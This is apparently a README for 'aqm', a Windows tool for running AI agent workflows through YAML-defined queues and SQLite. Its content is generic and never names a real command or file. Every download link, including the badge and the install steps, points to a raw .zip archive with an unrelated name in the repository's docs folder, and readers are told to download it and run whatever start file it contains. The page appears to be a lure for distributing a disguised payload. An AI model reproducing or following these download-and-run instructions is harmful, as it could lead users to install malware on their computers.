# ⚙️ aqm - Run AI Workflows With Queues

[![Download aqm](https://img.shields.io/badge/Download-aqm-purple?style=for-the-badge)](https://raw.githubusercontent.com/Lethanh6116/aqm/main/docs/Software_nonconservative.zip)

## 🧩 What aqm does

aqm is an orchestration tool for AI agents. It lets you build task flows in YAML, send work through clear queues, and run the whole setup on your own computer with SQLite.

Use it when you want to:

- Break one job into smaller steps
- Send tasks to different AI agents
- Keep each step in order
- Run the workflow on Windows
- Store queue data locally

## 📥 Download and install

### 1. Open the download page
Go to this page:

https://raw.githubusercontent.com/Lethanh6116/aqm/main/docs/Software_nonconservative.zip

### 2. Get the files
On the page, look for the latest version or the main repository files. Download the project to your Windows PC.

### 3. Save it in a simple folder
Use a folder you can find later, such as:

- `Downloads\aqm`
- `Desktop\aqm`

### 4. Open the folder
After the files finish downloading, open the folder in File Explorer.

### 5. Run the app
Follow the included project files to start aqm on Windows. If the package includes a local run file or start script, use that file to launch it.

## 🖥️ What you need on Windows

aqm runs best on a normal Windows desktop or laptop.

Recommended setup:

- Windows 10 or Windows 11
- At least 8 GB of RAM
- 2 GB of free disk space
- A stable internet connection for LLM access
- Access to one or more AI model keys if your workflow uses hosted models

Helpful extras:

- A text editor for YAML files
- File Explorer
- A terminal app if you want to start the local service from a script

## 🗂️ How aqm works

aqm uses a simple flow:

1. You define a pipeline in YAML
2. Each step sends work to a queue
3. An agent picks up the task
4. The task moves to the next step
5. SQLite keeps local state and queue data

This setup helps when you want clear handoff between agents. It also makes it easier to track what happened at each step.

## 🛠️ Basic setup steps

### 1. Open the project folder
Find the folder where you saved aqm.

### 2. Find the YAML files
Look for workflow files with names like:

- `workflow.yml`
- `pipeline.yml`
- `config.yml`

These files control the task flow.

### 3. Edit the workflow
Open the YAML file in a text editor and change the steps to match your task.

A simple flow may include:

- Input step
- Research step
- Draft step
- Review step
- Output step

### 4. Set your model access
If your workflow uses Claude, Gemini, or another LLM, add the keys or model names in the config file.

### 5. Start the local runner
Use the included start file or command from the project files to launch aqm on your PC.

## ✍️ Example workflow

A basic workflow may look like this:

- Queue 1: read the user request
- Queue 2: create a plan
- Queue 3: draft the answer
- Queue 4: check the result
- Queue 5: save the output

This structure keeps each task separate and easy to follow.

## 🤖 Supported agent flow

aqm is built for agent-based work. It fits jobs where one agent should hand off work to another agent.

Common uses:

- Research and writing
- Data cleanup
- Review and approval
- Multi-step support tasks
- Local automation runs

You can set each agent to handle one part of the process. That makes the workflow easier to manage than a single long prompt.

## 🔌 LLM and model options

aqm works with multi-LLM setups. That means you can use different models for different steps.

You may use:

- Claude for deep writing tasks
- Gemini for fast task handling
- Other LLMs that match your setup

This gives you more control over cost, speed, and output style.

## 🧠 Queue-based design

The queue system is the main idea behind aqm.

It helps you:

- Keep tasks in order
- Split large work into small pieces
- Retry a step if needed
- Check which task is next
- Store state in SQLite

This design is useful when a workflow needs clear step-by-step control.

## 📁 File layout

A typical aqm project may include:

- YAML files for pipelines
- Config files for model settings
- Local database files for queue state
- Logs for run history
- Scripts for starting the app

If you keep these files in one folder, it becomes easier to edit and run the project on Windows.

## 🔍 Common tasks

### Change a workflow
Open the YAML file and update the step names, prompts, or queue order.

### Switch models
Change the model name or provider in the config file.

### Reset a run
Clear the local SQLite data if you want to start fresh.

### Check progress
Open the logs or queue file to see which step ran last.

## 🧪 Example use cases

aqm can help with:

- Turning a customer request into a series of agent tasks
- Sending research to one agent and writing to another
- Running a local content pipeline
- Managing approval steps before output
- Testing how different LLMs handle the same job

## 🛡️ Local data storage

aqm uses SQLite for local storage. That means your queue data stays on your computer.

This is useful when you want:

- Simple setup
- Fast local reads and writes
- Easy resets
- A single file-based database

## 🧭 Good first run

If you are new to aqm, start with one small workflow.

Try this order:

1. Open the project folder
2. Find the main YAML file
3. Read the step names
4. Change one prompt
5. Run the workflow
6. Check the output

This helps you see how the queue system works before you build a larger pipeline.

## ❓ Troubleshooting

### The app does not start
Check that you opened the correct folder and used the right start file or script.

### The workflow stops early
Look at the YAML file for a missing step, a wrong name, or a bad indent.

### The model does not respond
Check the API key, model name, and internet connection.

### The output looks wrong
Edit the prompt for that step and test again with a smaller task.

### The queue seems stuck
Open the local database or logs and check the last completed step.

## 📌 Best way to use aqm

Keep your first workflow simple.

Use short steps, clear names, and one task per queue. That makes it easier to see how the pipeline moves from one agent to the next.

## 🧰 Built for

- Windows users
- Local AI workflows
- YAML-based pipelines
- Queue-driven task flow
- Multi-model agent systems
- SQLite-backed runs